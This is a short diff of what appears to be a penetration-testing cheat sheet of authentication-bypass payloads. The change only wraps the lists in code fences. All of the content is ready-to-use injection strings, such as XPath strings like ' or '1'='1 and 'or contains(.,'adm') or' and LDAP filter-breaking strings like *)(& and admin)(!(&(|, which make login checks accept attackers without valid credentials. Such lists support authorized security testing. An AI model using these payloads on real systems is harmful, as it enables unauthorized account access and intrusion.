@@ -2,7 +2,7 @@
 Xpath Injection, LDAP Injection, SQL Injection Authentication Bypass
 
 XPATH Injection Authentication Bypass:
-' or '1'='1
+```' or '1'='1
 ' or ''='
 ' or 1]%00
 ' or /* or '
@@ -14,10 +14,10 @@ XPATH Injection Authentication Bypass:
 'or contains(.,'adm') or'
 'or position()=2 or'
 admin' or '
-admin' or '1'='2
+admin' or '1'='2```
 
 LDAP Injection Authentication Bypass:
-*
+```*
 *)(&
 *)(|(&
 pwd)
@@ -27,4 +27,4 @@ admin)(&)
 pwd
 admin)(!(&(|
 pwd))
-admin))(|(|
+admin))(|(|```
